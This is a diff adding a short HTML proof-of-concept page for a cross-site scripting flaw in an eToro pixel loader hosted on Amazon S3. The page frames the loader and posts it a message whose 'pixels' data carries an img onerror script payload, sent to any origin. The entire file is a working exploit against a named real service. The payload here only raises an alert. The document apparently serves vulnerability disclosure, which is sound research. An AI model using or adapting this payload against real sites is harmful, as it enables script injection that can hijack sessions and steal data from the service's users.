@@ -1,1 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>eToro XSS PoC</title>
+</head>
+<body>
 
+<h2>eToro Pixel Loader XSS PoC</h2>
+
+<iframe id="f" src="https://etoro-px.s3-eu-west-1.amazonaws.com/loaders/history-changes-r.html"></iframe>
+
+<script>
+window.addEventListener("message", (e) => {
+  console.log("Received message:", e.data);
+});
+
+setTimeout(() => {
+  document.getElementById('f').contentWindow.postMessage({
+    type: "pixels",
+    pixels: [{
+      Data: "<img src=x onerror=alert('XSS from GitHub PoC')>"
+    }]
+  }, "*");
+}, 1500);
+</script>
+
+</body>
+</html>
